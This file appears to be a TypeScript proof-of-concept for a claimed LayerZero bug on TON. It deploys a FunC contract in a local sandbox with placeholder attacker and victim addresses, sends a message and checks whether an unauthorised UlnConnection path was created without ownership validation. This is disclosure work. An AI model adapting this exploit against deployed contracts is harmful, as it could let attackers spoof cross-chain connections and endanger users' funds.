import { Blockchain, SandboxContract } from "@ton/sandbox";
import { Cell, beginCell } from "@ton/core";
import { compileFunc } from "@ton-community/func-js";
import fs from "fs";

async function main() {
    console.log("\n===============================");
    console.log(" LAYERZERO – REAL BUG PoC");
    console.log("===============================\n");

    // ---------------- COMPILATION ----------------

    const compiled = await compileFunc({
        targets: ["poc-deploy-connection.fc"],
        sources: (p) => fs.readFileSync(p, "utf8")
    });

    const codeCell = Cell.fromBoc(Buffer.from(compiled.codeBoc, "base64"))[0];

    // ---------------- BLOCKCHAIN INIT ----------------

    const blockchain = await Blockchain.create();

    const attackerAddr = BigInt("0xAAAA");
    const victimOApp   = BigInt("0xBBBB");
    const managerEid   = 30101;

    const dataCell = beginCell()
        .storeUint(attackerAddr, 256)
        .storeUint(victimOApp,   256)
        .storeUint(managerEid,    32)
        .endCell();

    const contract = await blockchain.openContract({
        code: codeCell,
        data: dataCell
    });

    // BEFORE (should be empty)
    console.log("Before execution:");
    let before = await contract.get("get_spoofed_path");
    console.log("Data cell:", before.toString("hex"));

    // ---------------- PERFORM THE ATTACK ----------------

    console.log("\nExecuting spoofing attack...\n");

    await contract.sendInternalMessage({
        value: 0n,
        from: attackerAddr,
        body: beginCell().endCell()
    });

    // ---------------- AFTER ----------------

    let after = await contract.get("get_spoofed_path");
    let cs = after.beginParse();

    let srcEid  = cs.loadUint(32);
    let srcOApp = cs.loadUint(256);
    let dstEid  = cs.loadUint(32);
    let dstOApp = cs.loadUint(256);

    console.log("=== PoC RESULTS ===");
    console.log("srcEid: ", srcEid);
    console.log("srcOApp (caller):", "0x" + srcOApp.toString(16));
    console.log("dstEid: ", dstEid);
    console.log("dstOApp (victim):", "0x" + dstOApp.toString(16));

    // ---------------- VALIDATION ----------------

    if (srcOApp === attackerAddr && dstOApp === victimOApp) {
        console.log("\n🚨 CRITICAL VULNERABILITY CONFIRMED");
        console.log("- Attacker successfully created UlnConnection");
        console.log("- dstOApp controlled by attacker (victim set arbitrarily)");
        console.log("- No ownership validation performed");
        console.log("- This violates LayerZero security model\n");
    } else {
        console.log("\n❌ No bug detected (unexpected)\n");
    }
}

main();
